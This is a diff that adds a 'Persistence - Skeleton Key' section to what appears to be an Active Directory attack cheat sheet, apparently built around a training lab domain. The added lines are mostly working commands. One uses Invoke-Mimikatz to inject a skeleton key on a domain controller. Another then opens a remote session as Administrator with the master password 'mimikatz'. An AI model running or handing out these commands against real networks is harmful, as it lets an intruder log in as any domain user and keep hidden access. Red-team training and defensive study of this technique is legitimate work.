@@ -246,7 +246,15 @@ C:\Windows\system32> set username
 C:\Windows\system32> set computername
 ```
 
+# Persistence - Skeleton Key
+```powershell
+# Skeleton key allows you to access as any user with a single password
+#1- Inject a skeleton key on a DC
+C:\AD> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local
 
+#2- Now it's possible to access any machine with a valid username and password as "mimikatz"
+Enter-PSSession -Computername dcorp-dc -credential dcorp\Administrator
+```
 
 
 
